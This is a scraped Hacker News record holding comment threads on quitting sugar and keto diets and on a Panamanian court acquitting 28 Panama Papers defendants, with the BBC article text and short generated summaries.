hours agorootparent>This is like: Exercising willpower is an important life skill. Being able to will be extremely helpful in way too many occasions to count. >Fasting wont take away the cravings It will, actually. Sugar cravings are very different relative to regular hunger, and are really gone for good within 48h. >after a few days you feel very hungry and all you can think about is food, The \"all you can think\" is just not true. It's just regular hunger. You can then eat. Just not sugar, but actual nutritious food. I'd suggest a cadence of one meal a day, or two but not far apart from each other (e.g. 18:6 intermittent fasting). It is actually and, quite surprisingly for many, easy to do this. reply hombre_fatal 5 hours agorootparentWillpower, propensity for addiction, susceptibility to sugar, etc. aren't equally distributed. The people you're preaching to have tried all those things. Your advice cashes out into \"land better in the distribution like me and then confuse it for a character trait like I do\". reply snvzz 2 hours agorootparent>have tried Apparently not hard enough. >\"land better in the distribution like me...\" This line of thinking you are describing there is classic loser mentality. The successes of others are always because of \"luck\". It couldn't possibly be that they put in the hard work when you weren't looking. Of course not. Entertaining such ideas would lead to looking inwards, and there's only darkness to be found inwards. This is a problem that outsiders cannot fix. They have to realize the problem themselves, and only then will they be able to move forward. reply vouaobrasil 7 hours agoprevIt was fairly easy for me. After two weeks without foods with added sugar, I stopped craving it. reply alberth 6 hours agoprevWhat’s worked for me … Only eat what’s in your refrigerator, and don’t eat anything from a pantry or freezer. Sugar (and carbs) are predominately found in pantry and freezer goods. reply coldtea 5 hours agoparentAren't your meat and fish stored in your freezer? reply breck 7 hours agoprevI'm 254 days into switching to a ketogenic diet (complete with at home instant ketone finger prick blood tests using the very affordable keto mojo), and can't believe I waited so long. I was roughly surfing sugar highs for 39 years. Would highly recommend looking into this if you are a sugar/carb addict like I was. reply medler 6 hours agoparentMy problem with keto is that most people on it eat so much saturated fat that their cholesterol goes through the roof, and that’s really bad for cardiovascular health. (Keto communities deal with this by preaching an anti-science, cholesterol-denialist dogma, but that dogma has always been driven by wishful thinking). reply coldtea 5 hours agorootparent>My problem with keto is that most people on it eat so much saturated fat that their cholesterol goes through the roof \"In pricinple\" or actually measured cholesterol levels? Because the latter doesn't happen. reply medler 4 hours agorootparentIt doesn’t happen for everyone, but most people on a high-saturated-fat diet will see higher measured cholesterol levels. This has been established in many studies. And anecdotally, it happened to me when I was on a low-carb diet reply breck 5 hours agorootparentprev> My problem with keto is that most people on it eat so much saturated fat that their cholesterol goes through the roof Dataset needed reply medler 5 hours agorootparentHere are a couple of studies: https://www.med.ubc.ca/news/popular-keto-diet-may-be-linked-... https://www.ncbi.nlm.nih.gov/pmc/articles/PMC10121782/ reply breck 4 hours agorootparentOk, thanks for the links. I had time to read the first study you shared. Here is the link to the actual study: https://www.sciencedirect.com/science/article/pii/S2772963X2... Positives: - PDF is available! - Nice formatting - Very well written, very clear what they did Negatives: - Not an experiment. An observational study. - If I'm reading correctly, they classified someone's diet mostly based on 1 single prior 24 hour food questionnaire. This is a bit...weak. - The LCHF cohort has significant pre-existing conditions (which they do correct for, but their headline is about the non-corrected number) - They define LCHF diets as being My biggest problem with Keto is that is that one bad meal and your out Until you deplete the sugar stores. So like fast 24h and you're back in. reply malux85 7 hours agoparentprevMe too, about same time as you. Life-changing productivity increase and focus/deep work extension! reply waynenilsen 7 hours agoparentprevHow much protein can you eat before getting kicked out of ketosis? reply heelix 6 hours agorootparentCarbs are what kick you out of ketosis. Protein and fats won't, but they have other issues. (Fiber can be a real challenge) reply chollida1 7 hours agorootparentprevwhy would protein kick you out of ketosis, on Keto alot of people, especially athletes load up on as much protein as they can and use fat to get the rest of their calories. reply xcskier56 7 hours agorootparentMy biochem is a little rusty but basically your body can create glucose (carbs) from amino acids (proteins) in a process called gluconeogenesis. Because your body will preferentially use glucose over fat and ketones for fuel, it will prioritize this pathway and turn down/off the one that produces ketones... hence dropping you out of ketosis. reply DougWebb 6 hours agorootparentYour body doesn't prefer glucose over fat. Too much glucose is toxic, so your body will focus on reducing it first. Too little is also dangerous so your body will make some from protein if necessary. But only as much as it needs. Fat adaptation is about shifting your hormonal balance and response to retrain your body to maintain a lower level of glucose, and to retrain your cravings and hunger. reply xcskier56 5 hours agorootparentI'm not talking at the higher organism level, I'm talking at the very low-level chemistry in mitochondria. Glucose is \"easier\" to produce energy out of and so that happens preferentially from a chemistry perspective. Your body also needs a minimum level of glucose to survive. When there isn't enough glycogen, the chemical balances in the mitochondria change and the liver mitochondria will produce glucose from whatever they have. This isn't a \"decision\" just the relative amounts of the chemicals change leading to one chemical pathway becoming more likely compared to another. This is all mediated by the random collisions of molecules in your cells. If you have a lot less of one molecule compared to another, the frequency that molecules find each other to do one thing v/s the other will change leading to different chemical pathways becoming more or less active. There are many routes for your body to produce glucose. It is \"easier\" for your body to produce it from gluconegenic amino acids (not all amino acids can be used to produce glucose) than it is from fatty acids. It's the process of converting fatty acids into glucose that generates ketones. So when you have excess amino acids that can be turned into glucose, the chemistry will prefer this pathway over breaking down fat into glucose and this will lead to lower ketone production overall and kick you out of ketosis. (I think I've gotten the gist of this right but any biochem experts feel free to correct me) reply jddj 6 hours agorootparentprevI can't speak to whether or not it's true, but I heard the response to this question being that this process is quite precise, and functions specifically to meet the brain's glucose needs and nothing more. reply swiftcoder 7 hours agorootparentprev> on Keto alot of people, especially athletes load up on as much protein as they can This only works because athletes tend to have pretty insane protein (and calorie!) demands. If you as a regular, non-athlete person load up on protein (while neglecting to consume sufficient fat), your body will be forced to convert the protein into glucose, and you'll fall right out of ketosis reply KptMarchewa 6 hours agorootparentFirst of all, it's not a binary process. reply oarfish 7 hours agorootparentprevAs an athlete you shouldn't avoid carbs, unless you are ok with impairing your athletic performance. reply silverquiet 7 hours agorootparentprevI was under the impression that the body can synthesize sugars if given enough protein. reply oarfish 7 hours agorootparentI think you can make 150g or so of glucose (?) yourself, but whether thats enough might depend on what you are doing in life i think. reply richrichie 8 hours agoprevSugar is everywhere, cheap, legal and culturally important (birthday parties, weddings, farewell parties, etc). Very difficult to create isolation environment, unless one goes full Ted Kaczynski. I don’t want to discourage the author, but i am old, so yeah been there, done that. But avoiding sugar like its evil is not healthy. Nor is it sustainable. It appears that the author is probably young and single. That may help with this regimen. However, it is best to adopt a less extreme strategy for stress free happiness. reply m000 7 hours agoparent> Very difficult to create isolation environment If you eat at home, it's actually pretty easy: Just go to the supermarket with a full belly. It's amazing how disciplined one can be in their groceries shopping when they shop with a full stomach. When, eventually, your fridge and pantry aren't stocked with sugary junk, it's a change of environment! After that, it's pretty much out of sight, out of mind. The ocassional indulgence at a social event is not the end of the world. The real problem is that many city people don't really plan their groceries, but just open doordash/flink/gorillas/whatever when they are already hungry and tired. No good choices are going to come from that habit. reply strken 7 hours agoparentprevIt's pretty easy to avoid large quantities of refined or concentrated sugar on most days of your life, and that's the part that would be a big improvement to every diet that doesn't belong to an athlete. reply Xenoamorphous 7 hours agoparentprev> Sugar is everywhere, cheap, legal and culturally important (birthday parties, weddings, farewell parties, etc). Those should all be rare occasions. reply swiftcoder 7 hours agorootparentYou don't work in a very big office before there is birthday cake in the break room on the regular. Or the Girl Scout cookies someone's parents are desperately trying to get rid of. Or the left-over pastries from that executive meeting. Or your manager brought in a box of donuts to \"boost morale\"... Dieting in an office setting is often quite difficult reply m000 5 hours agorootparentOne more reason for people not wanting to return to the office I guess. reply okr 7 hours agorootparentprevIn a social environment these things are not rare. I wish. But ppl dont stop having these birthdays distributed all over the year. :) reply alanbernstein 7 hours agorootparentprevNot rare at all for an average family with kids. reply FredPret 7 hours agoparentprevSugar is indeed ubiquitous but there’s an increasing number of people who regard it as poison, so it’s actually becoming more and more feasible (depending on what circles you’re in). reply simplicio 7 hours agoparentprevYea, hadn't realized this till I had kids. People are basically constantly throwing sweets at them, and while Im not super-strict about regulating sugar, if I let them eat all the candy they were offered, it'd basically be all their calories in a given day. reply yellow_postit 7 hours agoparentprevMichael Pollan’s : “Eat food. Not too much. Mostly plants.” continues to be a useful way for me to look at food X life. reply stavros 7 hours agoparentprevI've decided that I won't eat anything sweet from a supermarket. It keeps all the low-hanging sugar away (chocolates, cakes, donuts, etc) while still leaving me able to enjoy a nice dessert at a restaurant, or similar rare occasions. reply marginalia_nu 7 hours agoparentprevLow carb has been around for a while, enough that people are aware it's a thing, and it's not that hard to pass up on the celebratory sugar, if you want just say it's for a medical condition and don't elaborate further and people will generally respect that. You aren't really telling us why this is unhealthy and unsustainable and stressful. In my experience avoiding sugar in the past, it's anything but. reply oarfish 7 hours agorootparentTo avoid sugar might not be impractical, but to avoid carbs altogether and go full keto? Very difficult for many, and would probably reduce my enjoyment of life quite a bit. reply marginalia_nu 6 hours agorootparentA smoker will say the same thing, smoking is a very pleasurable thing after all, the first hit in the morning can be almost orgasmic and if you go pack a day you get some of that sense of well-being more than once an hour. It really takes the edge off things. Yet it's quite possible to enjoy life without nicotine, as it is possible to enjoy life without high-carb foods. reply itomato 7 hours agoparentprevI think a big piece is that accepting it as culturally important is not healthy or sustainable. You're not a victim of evil, you're just a product of that unmotivated culture. reply richrichie 5 hours agorootparentEating a slice of cake with coffee with your partner or friend or coworkers, enjoying a bowl of ice-cream with your children are important to a life well lived. Of course, standard disclaimers apply i.e. eat good quality cakes and ice cream, etc. reply ThinkBeat 7 hours agoprevAn interesting question is what behavior the author has developed as an alternative to sugar. If anything. reply squidbeak 4 hours agoprevMy diet used to be as bad as Hansel and Gretel's. A long-term keto diet neutralised the habit for a few years. But after it returned, what worked for me in changing it was to rigorously substitute plain foods for the richly processed stuff (meals and snacks) until I learned to appreciate simple tastes. For instance snacking on fruit, nuts, crackers and ryvita, buttered toast, cottage cheese and natural yoghurt. I wasn't able to shake my chocolate cravings, but over time, the pull of intensely sweet stuff died back, to the point where the sugar rush from ice cream or wedge of chocolate cake makes me feel sick enough for me to prefer to avoid them. To anyone who tries this approach, good luck. reply andrewtbham 6 hours agoprevI think the author read atomic habits. Even the story about vietnam is in there. reply keepamovin 7 hours agoprevIs semaglutide to sugar what naltrexone is to opiates? reply infecto 7 hours agoparentHmmm I think it goes much further since semaglutide is showing promise and helping those with alcohol addiction. reply swiftcoder 7 hours agorootparentIs alcohol dependencies all that different, chemically? Alcohol metabolises to sugar pretty damn well (at least till your liver gives up) reply Traubenfuchs 7 hours agorootparentCompletely different. Alcohol works on the GABA receptors, just like common sleeping/anxiety/panic pills, the benzodiazepines and benzo-like medication/drugs. Both alcohol and benzo withdrawal is a nightmare and severe alcohol withdrawal is usually managed with benzos. reply mdip 4 hours agoprevMy son is struggling with this right now and it's entirely my fault. I've never been outside of 15 pounds what I weighed in High School and I was underweight in High School. As a man in his 40s, I'm in better shape than I was back then, lower body fat, slightly more muscle, triglycerides/LDL/HDL better[0]. I eat how a 10-year-old kid would eat if he didn't have parents. All of my breakfast foods (which I never eat in the morning) have cartoon characters on the box. Fruity/Cocoa Pebbles, Honeycomb, Cookie Crisp, Lucky Charms, Cocoa Krispies, Fruit Loops, Frosted Gluten-Wheats, (of course) Cap'n Crunch ... actually, worse -- I buy the Malt-O-Meal generic versions of each that come in the cement bags. I can't think of the last time I drank water. I drink Coca-cola, instead. At least twice a week I make a half-gallon chocolate malt and consume the entire thing. Sometimes that's dinner. It's the only reason I own a blender. It's the reason blenders last about 2 years, tops, for me -- typically with dead motors or a shattered carafe[1]. I make the whole carafe for myself (the kids split half of one). I rarely eat Breakfast or Lunch. Dinner is something frozen and tossed in an Air Fryer or ordered. I often add a meal just before bed that consists of several bowls of one of the previously mentioned cereals. I do none of this with any sort of planning. I get hungry, I find food, I eat it. If I'm depressed, I don't eat. If I'm busy doing something else I might forget to eat. When I'd travel solo for work, I'd go through my receipts and find out I ate twice at the airport on the way out/in, and spend an hour looking for meal receipts until I figure out that -- yes, I actually did only pay for three meals that week. Yes, one of those \"meals\" was an Arizona Peach Tea, half of which was left somewhere and for some reason I felt it necessary to both get and keep the receipt for the $1.00 purchase but at least the expense department will be satisfied ... if not a little surprised. My 16-year-old son is having success with a restrictive Low Carb/No Sugar diet and I've found myself at a loss as to how to help him, but many of the things the author mentioned (short of a vacation I can't afford) have worked very well. My observation is that the author's top two items are the most effective parts if you can do the first. My alternative to the \"vacation\" for him is distraction. He's a lot like me: an indoor cat who likes computers and video games and doesn't like sports. I focused on things he really liked that were active and upgraded him -- he got a better VR kit and we upgraded the OneWheel[2]. He learned the first few days that when he gets hungry, the best thing to do is use one of those and the one that gets him out of the house is the one that works best. Though we could have taken a vacation for the cost of the upgrade, he wouldn't be putting in ten miles on it every day. And I think that's part of it: finding something he loves to do which involves a lot of exercise. So far, that's the OneWheel GT (and I feel the same way). He uses the VR. It's about what you'd expect. The few games he enjoys aren't much exercise and the ones that are exercise focused aren't any fun. Luckily he doesn't get motion sick, but that was a pointless purchase for these purposes. And I assumed it would be: I've been through all of the previous attempts to make exercise fun with video games: Wii, every version of Kinect, various others dating back to the Nintendo floor pad with their weird Olympics game, both of which I destroyed in my youth. They usually make some form of exercise less effective while making \"wanting to do that form of exercise\" slightly more attractive for a brief period of time. The optimal situation would be a game that can be played at home with low-cost equipment which \"people want to play because it's fun to play\" that happens to require a reasonable amount of physical exercise to use. Ideally, it'd be something that wouldn't be \"more enjoyable with a more common control scheme\", nor would physical strength greatly improve ones ability to master the game (so, like most video games, they're more mental strategy vs precision muscle memory) and would be multi-player. I've yet to encounter something that doesn't fall over on all of these points so badly as to make it worse than traditional exercise. [0] I was a kid during a brief period when they advocated giving children as young as 10-years old cholesterol tests and then putting them on low-fat diets when they (generally) had \"High Cholesterol\". [1] Which is only a problem if the carafe is for an ALDI Aisle of Shame $39 blender and finding a replacement is either impossible or almost as expensive. After every expensive blender I owned failed, I'd somehow end up finding a crappy one at ALDI figuring \"The $200 one died quickly, might as well save the money this time.\" [2] We had a Pint and we've gone through a few tires and about 9K miles on that one. When ridden hard, you come home soaked head to toe in sweat, but it's one thing that he enjoys as much as (if not more) than playing video games. reply cess11 3 hours agoparentSounds like you have an eating disorder and might benefit from therapy. reply RickJWagner 4 hours agoprevThis was a great, uplifting post. I'm happy for the author. I love sugar. Sugar cereals, sugar snacks, and especially anything that has peanut butter. But I've recently started to cut back. (i.e. Greek yogurt with fruit for a snack). So far, about a week in, things feel good and I've dropped about 6 pounds. (!!) I hope I can find more ways to make it easier. reply Theodores 4 hours agoprevI quit sugar after a stint volunteering in a homeless shelter, where I saw how people were with sugar. I was horrified, so I went cold turkey! Some say that going to an abattoir means becoming an instant vegan, seeing zombies with sugar at three in the morning had a similar effect on me. I don't see sugar as the root of all evil, the master of all addictions. However, it is easy to quit and, if you can do that, you can quit anything else, including addictive substances. The reason is that, if you are avoiding all added sugar, then you have to cook. It means no more processed food and an improvement to the metabolism. However, the quit sugar idea does attract people that want to lose weight, which is a noble goal, but not the same thing as wanting to live an active life at a healthy weight. This means that most people drawn to no sugar are on a keto diet with all that this entails. For the keto diet person all carbohydrates are the enemy, with fat and protein as the allowed macronutrients. I was open to completely changing my diet as, until the eye-opening experience, I had always put employers or others first and not really thought a great deal about nutrition. My 'intellect' was more concerned with programming languages than what I should be stuffing my face with! Knowing nothing about the subject, I did want to know why I felt so much better from giving up sugar. So I investigated diet and nutrition. I developed new habits including when shopping. I mostly buy vegetables and supplement vitamin B12. The experiment is going very well. I quit coffee and much else, to arrive independently at a 'whole food, plant based' diet, which is 'closet vegan'. I clung on to butter for quite a while, but cut that cord to reject a lot of the 'anti-carb' thinking that goes with the keto diet. I don't eat a lot of 'evil carbs', as viewed by the fat eating keto people. This is because I usually have so many leafy greens, legumes and other vegetables that I just don't have the need for a plate full of rice, pasta or whatever else is 'evil carbs'. The thing is that every calorie has to have nutrition, so sugar is 'empty calories' with no nutritional value. I seem to be fine without it, I can go cycling for all the daylight hours in the day and not need anything more than a few pieces of fruit and a sandwich made with the help of a bread machine. I don't think that not eating sugar is that big a deal, but it can be a very useful stepping stone towards arriving at a sustainable lifestyle that is not a 'diet'. Much of the 'science' regarding why sugar is allegedly bad is not as clear cut as it should be. I have heard all about 'fructose' and 'ketosis'. I have also learned a little bit about history and how we came to be living a pastoral life in the UK before the Romans arrived. There has always been conflict between the people that farm grains and the people that eat animal products, with an overlap between the two camps. This is why we have people insisting that full keto, whale blubber only, is the way to go, then we have people insistent on vegan as the way to go, with the majority being okay with 'everything in moderation'. In conversation I have mentioned that I 'quit all processed food' and that does not seem to trigger anyone. I really did manage to quit everything I was addicted to, but I don't see sugar as an addiction, even though I ate it every day for decades. I did take sugar for granted and I would eat things in front of the TV without truly savouring the taste. I can't quite remember what those sticky toffee puddings tasted like, or some chocolate bars that I had thousands of times. I would recommend quitting sugar, however, you must be open to the possibility that you really will want to quit for good, to be eating fruit out of choice, and to want herbs and spices rather than biscuits and chips in the supermarket. If you get a figure that you enjoy living in and see cancerous moles vanish on your skin, then it can be hard to want to go back to a diet that includes sugar. There are no upsides to it once you get the health gains. Hence, before you quit sugar, compile a list of your favourite things and spend a solid month savouring them, as a farewell tour. Enjoy with the TV off, in that way, when you have gone past the point of turning back, you can remember what these things tasted like, to not miss them or wonder. I always keep my receipts for my grocery shopping. I would not be full of shame if someone were to read them and try to mock my food choices. Everything is healthy. I have not used my fridge or freezer with this experiment, so they are turned off at the wall. My food is always fresh. It turned out that everything in my fridge was just trying to kill me and vegetables prefer being outside the morgue that is the fridge. My food waste is almost zero, although I did throw half a turnip out recently. Even my recycling bin is getting to zero, that has not seen plastic in a very long time, glass jars are rare and even tins are getting rare. Sometimes I think about quitting my peculiar lifestyle, to turn the fridge and freezer back on, to stock them with sticky toffee puddings, vast slabs of cheese and everything else laced with fat and sugar. I could toss the vegetables out and put ready made meals in the microwave, or frozen pizza in the oven. I found that we put the horse before the cart with 'exercise'. I found that, get the nutrition right, and the physical activity comes naturally. But, playing devil's advocate, I think about going to fizzy drinks, sticky toffee puddings and beer. I could get man boobs and a beer gut, maybe with an extra chin or two. I would never need to spend twenty minutes chopping vegetables ever again, oh, it could be so easy! But no, I am staying off the sugar. However, it is no big deal, I just live in a parallel universe of vegetables with no processed sugar or silly science about the evils of fructose. Sugar is not evil, I just prefer the whole food, plant based life as a 'closet vegan'. reply ModernMech 6 hours agoprevI just switched to Pepsi Max, cut my sugar intake by 75% reply Traubenfuchs 7 hours agoprev [–] You can eat whatever you want if you just work out seriously an hour a day. If you do that properly, gaining weight will become the challenge. reply medler 6 hours agoparentUsually when you increase exercise, your body decreases its non-exercise calorie burn (NEAT), so your total calorie needs don’t change much. As a result, exercise is usually a wash for weight loss, unless you’re working hard to maintain your NEAT. (Exercise is still extremely good for you though!! Highly recommend!!!) reply asoneth 6 hours agoparentprevI also find it challenging to put on weight when exercising, but to make this comment more accurate you may want to caveat that this is how your body responds to exercise. Many people appear to experience a commensurate increase in appetite after exercise such that they do not lose weight unless they also consciously restrict calories. reply Fricken 5 hours agorootparentWith low intensity endurance training (cycling in zone 2) I find my appetite adjusts accordingly, and remains high for a period even if I'm not doing the exercise, and that's when I gain the weight. Resistance training (bouldering for me) seems to have little effect one way or the other. If I'm doing High intensity interval training (usually stair sprints) on a regular basis, it's hard to eat enough, my metabolism gets absolutely jacked. reply hombre_fatal 4 hours agoparentprevOnly someone without much of an appetite to begin with could claim this. :P One jar of peanut butter is 3000 calories alone. reply xnx 7 hours agoparentprev [–] An hour of strenuous exercise might burn 800 calories. That can be undone in moments with one milkshake. reply keepamovin 6 hours agorootparentI feel like this is an oversimplification. Exercise has compounding effects. That 1 hour of effort doesn't just burn 800, even if that's all that is used in 1 hour. The increase in metabolism ups your burn for the rest of the hours in the day (some at least, trailing off presumably). And any increase in BMR or muscle mass will keep that per hour calorie cost even higher. reply alamortsubite 6 hours agorootparentprev [–] Milkshakes aren't the way to go. On long runs I bring ziplocks stuffed with marshmallows. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The author shares a personal journey of overcoming a sugar addiction that began in childhood and persisted into adulthood.",
      "Three key strategies were instrumental: changing the environment, removing sugary foods from the home, and adopting positive habits like regular exercise and hydration.",
      "The post aims to inspire others struggling with sugar addiction by demonstrating that overcoming it is achievable with the right approach."
    ],
    "commentSummary": [
      "The author overcame their sugar addiction by keeping their kitchen stocked with diet soda, meat, cheese, yogurt, and peanut butter, and avoiding treats.",
      "They suggest chocolate lovers opt for 90% or 95% chocolate to prevent overeating.",
      "Others shared similar strategies, such as keeping treats out of sight, switching to healthier snacks, and making gradual reductions in sugar intake, with some finding success through keto diets, fasting, or replacing sugary foods with fruits."
    ],
    "points": 116,
    "commentCount": 176,
    "retryCount": 0,
    "time": 1719658324
  },
  {
    "id": 40829653,
    "title": "Panama Papers: Court acquits all 28 charged with money laundering",
    "originLink": "https://www.bbc.com/news/articles/cjer3llen42o",
    "originBody": "Panama Papers: Court acquits all 28 charged with money laundering 11 hours ago By Anna Lamche, BBC News Share MARTIN BERNETTI/AFP via Getty Images Jurgen Mossack was one of the main defendants in the Panama Papers case A Panamanian court has acquitted all 28 people charged with money laundering in connection with the Panama Papers scandal, concluding a trial that began in April. The secret financial documents were leaked in 2016, revealing how some of the world's richest and most powerful people use tax havens to hide their wealth. Among those exonerated were Jurgen Mossack and the late Ramon Fonseca, founder of Mossack Fonseca, the defunct law firm at the centre of the scandal. Judge Baloisa Marquinez said the evidence considered by the court was \"not sufficient\" to determine the criminal responsibility of the defendants. During the trial, the prosecution sought the maximum sentence of 12 years for money laundering for both Mr Mossack and Mr Fonseca, who died in hospital in May. Both Mr Mossack and Mr Fonseca denied they, their firm or their employees had acted illegally. The trial, which took place in Panama City, lasted 85 hours, took testimony from 27 witnesses and considered over 50 pieces of documentary evidence, according to local news reports. After an extended period of deliberation, the judge said evidence collected from Mossack Fonseca's servers had not been gathered in line with due process and dropped all criminal charges against the defendants. The biggest data leak in history, the Panama Papers, saw 11 million documents released to the German newspaper Sueddeutsche Zeitung and shared with an international team of journalists. In 2017, Mossack Fonseca said the firm had been the victim of a computer hack and that the information leaked was being misrepresented. Foreign Secretary David Cameron, Ukraine's President Volodymyr Zelensky and Argentinian football star Lionel Messi were among those whose affairs came under scrutiny following the leak. In total the data revealed links to 12 current or former heads of state and government, including dictators accused of embezzling money from their own countries.",
    "commentLink": "https://news.ycombinator.com/item?id=40829653",
    "commentBody": "Panama Papers: Court acquits all 28 charged with money laundering (bbc.com)106 points by atombender 7 hours agohidepastfavorite44 comments Aurornis 5 hours agoHeadline is misleading if you don’t read the article: This only refers to one judge in Panama dismissing a set of charges. Many other people around the world have been charged in connection with the Panama Papers leak. It’s not very surprising that a judge in Panama is dropping charges related to the leak. The entire reason this scheme was operated in Panama was because the legal system there is favorable to such schemes. That doesn’t mean people are free to evade the laws of their own home countries, though. Prosecutions continue based on what was released. Several people in the US have been successfully prosecuted, for example. The headline makes it sound like everybody got away with everything everywhere, which plays into the doomerism angle. It’s just bait though. Panama was always going to go easy on the Panamanian charges. That’s exactly why they did this in Panama! reply jjulius 5 hours agoparent>The headline makes it sound like everybody got away with everything everywhere... I don't know what a phrase like \"all 28\" means to you, but that reads exactly like 28 people in a specific case got off, to me. reply Aurornis 5 hours agorootparentThe phrase “all 28” could also be interpreted as though there were only 28 people charged in conjunction with the Panama Papers, and all of them were acquitted. Several other comments interpreted it that way, which is why I commented. reply toomuchtodo 4 hours agorootparentGreat comments, thanks for clarifying the situation. reply yunohn 5 hours agoparentprevIt’s not misleading? The article discusses the direct charges towards Mossack Fonseca, the literal mastermind of the tax evasion scheme. They are Panamian, so of course they would be tried in Panama and not elsewhere. reply Aurornis 5 hours agorootparentJudging by all the comments here, a lot of people interpreted it as thought “all” people charged in conjunction with the Panama Papers (everywhere) got away with it, because the headline says “all” reply jjulius 5 hours agorootparentMy interpretation is that most people in these comments were correctly able to understand why \"28\" immediately came after \"all\". reply Aurornis 5 hours agorootparentScroll down to see the comments from people claiming “literally nothing happened” from the Panama papers, which they see this headline as confirming. As I write this, that thread is the 2nd comment thread from the top. It’s a very popular sentiment, despite being wrong. reply yunohn 1 hour agorootparentThat’s literally just one of many other comment threads. reply setr 1 hour agorootparentprevYou’d have to also know that 28 is not the total number of people charged. reply em-bee 5 hours agorootparentprevthe headline is the reason why i am interested in an article. HN being US centric i expected a story about a US court, or, since the article is from the BBC, a british court. both would have been interesting. had the headline said \"panama court acquits...\" i'd have skipped it. so yes, i felt mislead and i appreciate the top comment for clearing that up. reply yunohn 1 hour agorootparentSorry but this is a crazy POV. You come to HN assuming and pushing for USA centric views, and refuse to click through and read news from other sources? reply beardyw 6 hours agoprevQuelle suprise. reply denton-scratch 5 hours agoprev> not been gathered in line with due process Well, that looks about right to me. I don't see how you can mount a valid prosecution based on evidence derived from a giant hack. reply Thiez 4 hours agoparentGenerally evidence gathered by the authorities may not be tainted, to discourage the police from breaking the law to gather evidence. This restriction does not usually apply to evidence collected by private citizens. In other words, if a burglar finds the dead bodies in your cellar, that evidence is admissable. reply denton-scratch 3 hours agorootparentDepends where you are. US law doesn't apply everywhere. Also, I'd guess that even in the USA, evidence produced by a burglar can be challenged on the grounds that it isn't what it purports to be. I suspect that US chain-of-custody rules etc. are meant for broader purposes than just controlling police corruption. The police are not the only people who can manipulate evidence. reply notarobot123 6 hours agoprevReminds me of something someone said a while back: > hey remember when the panama papers came out and revealed that all the rich people in the world are part of enormous criminal conspiracy to dodge taxes and hoard stolen wealth in offshore accounts and literally nothing happened reply janice1999 6 hours agoparent> literally nothing happened > Daphne Anne Caruana Galizia was a Maltese writer, journalist, blogger and anti-corruption activist, who reported on political events in Malta and was known internationally for her investigation of the Panama Papers, and subsequent assassination by car bomb https://en.wikipedia.org/wiki/Daphne_Caruana_Galizia reply stavros 5 hours agorootparentAt least something happened. reply cpach 5 hours agoparentprevNothing happened? Tell that to Swedish writer Håkan Nesser who was sentenced to 1,5 years in prison because of tax evasion that was revealed through the Panama papers. I’m not claiming everyone involved got busted, but at least for some it had real consequences. https://www.svt.se/kultur/forfattaren-hakan-nesser-doms-till... reply hamasho 4 hours agoparentprevI've been trying to stop my nihilistic and pessimistic views, cause they don't actually help improve things, but help me cope with injustice without getting hurt. But events like this really hit me. I don't need to be unrealistically optimistic, but it's possible that the situation can be improved a bit and maybe I can play a part in that. Well, if the cost of tax evasion increases by 1%, I can say it's a big win. reply fragmede 6 hours agoparentprevWhat a tiresome take. Mossack Fonseca was closed due to the leak, and Mossack and Fonseca were charged with money laundering. FIFA was investigated. A bunch of countries recovered a bunch of money due to the leak: https://en.wikipedia.org/wiki/Panama_Papers#Recovered_sums_f... Wikipedia has articles covering the list of things that happened in each country in response to the leak: https://en.wikipedia.org/wiki/Reactions_to_the_Panama_Papers Europe: https://en.wikipedia.org/wiki/Panama_Papers_(Europe) Asia: https://en.wikipedia.org/wiki/Panama_Papers_(Asia) North America: https://en.wikipedia.org/wiki/Panama_Papers_(North_America) South America: https://en.wikipedia.org/wiki/Panama_Papers_(South_America) Africa: https://en.wikipedia.org/wiki/Panama_Papers_(Africa) We didn't get the end of Fight Club or Mr. Robot where the global financial industry collapsed and we abolish money and we all live happily ever after, but \"literally nothing happened\" is just wrong. reply yunohn 5 hours agorootparent> Mossack Fonseca was closed due to the leak, and Mossack and Fonseca were charged with money laundering. Yes and those are literally the dismissed charges this article discusses. reply pas 1 hour agorootparentif other countries want they can put them on various lists, deny them future cash flows, clients, opportunities, whatever. and of course there have been many regulatory changes since then with regards to KYC/AML. are they enough? (are they even useful compared to how much hassle they are for average people? probably not it tax authorities don't do shit and don't audit rich people. but even that is changing.) reply yunohn 1 hour agorootparentYes but that’s not what the headline nor the article discuss. You’re free to misinterpret things till kingdom come, but that’s on you… reply stavros 6 hours agoprevSo basically, if someone leaks evidence of wrongdoing, the perpetrators can't be prosecuted because the evidence is tainted? That seems fucked. reply Aurornis 5 hours agoparentThis is just one trial in one country (Panama) where one judge dismissed the charges. This scheme was operated in Panama because the legal system is favorable to them. That’s why it’s called “Panama Papers” Many other people have been successfully charged throughout the world following the Panama Papers. Laws differ greatly across jurisdictions. Multiple people in the United States have been charged: https://en.m.wikipedia.org/wiki/Panama_Papers_(North_America... More court cases are pending around the world. Don’t generalize across the world from the actions of one Panamanian court. This tax haven scheme was operated in Panama specifically because the legal system there was favorable to what they were doing. reply stavros 5 hours agorootparentI'm not, my comment was about that one specific court (in the article). reply boomboomsubban 6 hours agoparentprevIt's the same logic that is supposed to prevent people from being prosecuted for things found by illegal wiretapping and such. Really though, the leaks should have prompted a quick search warrant that got around this. reply yunohn 6 hours agorootparentThere’s a world of difference between law enforcement doing illegal wiretapping and employees blowing the whistle. reply boomboomsubban 6 hours agorootparentSure, but if it didn't apply here law enforcement could illegally wiretap you, leak it to the press, and then charge you. Things are different, but solutions are hard. reply CryptoBanker 2 hours agorootparentOnly if you found a corrupt journalist who was willing to lie about their sources reply boomboomsubban 1 hour agorootparentOr one who accepted anonymous leaks. Or a law enforcement agent willing to lie about who they were. reply rvz 5 hours agoparentprevNot the first time something like this has happened. In fact it is the leakers are usually prosecuted instead of the perpetrators, even if they told the truth. For example, the leaker of the FinCEN files [0] was sentenced to prison for helping to expose the regulators and large banks allowing illicit transactions from criminals and drug cartels. [1] [0] https://www.icij.org/investigations/fincen-files/fincen-offi... [1] https://www.buzzfeednews.com/article/jasonleopold/fincen-fil... reply yunohn 6 hours agoparentprevYeah this judgement makes no sense. I assumed whistleblowing with insider evidence was an accepted way (and possibly the only way) to expose these kinds of massive wrongdoings. reply survirtual 6 hours agorootparentThere is no \"possibly\" about it. It is the only way to expose these wrongdoings. The system is rotten and rigged. The sooner people wake up to this reality, the better. Like any breakup, the longer you let the relationship go, the more difficult and painful it is when you end it. reply electric_mayhem 6 hours agorootparentprevIt makes perfect sense. The system is working exactly as intended. Rigged for the absurdly wealthy against everyone else on the planet. Laws (and consequences for breaking them) are for us, not them. reply highcountess 5 hours agorootparentUnfortunately, often the same people who are opposed to things like what you said “absurdly wealthy against everyone else”; also inadvertently support them and make them absurdly wealthy 